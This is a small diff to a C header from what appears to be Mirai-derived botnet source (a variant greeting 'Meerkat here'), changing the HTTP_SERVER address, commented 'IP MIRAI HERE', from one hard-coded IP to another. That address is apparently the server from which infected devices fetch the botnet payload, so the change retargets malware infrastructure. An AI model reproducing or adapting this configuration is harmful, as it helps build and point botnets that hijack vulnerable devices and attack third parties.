@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(134,122,30,138) //IP MIRAI HERE
+#define HTTP_SERVER utils_inet_addr(176,97,114,180) //IP MIRAI HERE
 
 #define EXEC_MSG            "Meerkat here\n"
 #define EXEC_MSG_LEN        6
